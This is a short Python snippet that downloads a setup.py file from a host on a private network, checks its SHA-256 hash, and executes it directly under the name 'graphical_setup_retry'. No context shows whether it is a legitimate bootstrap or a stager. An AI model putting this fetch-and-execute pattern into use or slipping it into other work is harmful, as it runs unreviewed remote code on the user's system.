import hashlib,urllib.request
b=urllib.request.urlopen('http://192.168.2.1:8766/setup.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='16a930151fb058a5c0c43b1843b8b4db2e9d1288a7624c0571842339a108cc15'
exec(compile(b,'graphical_setup_retry','exec'))
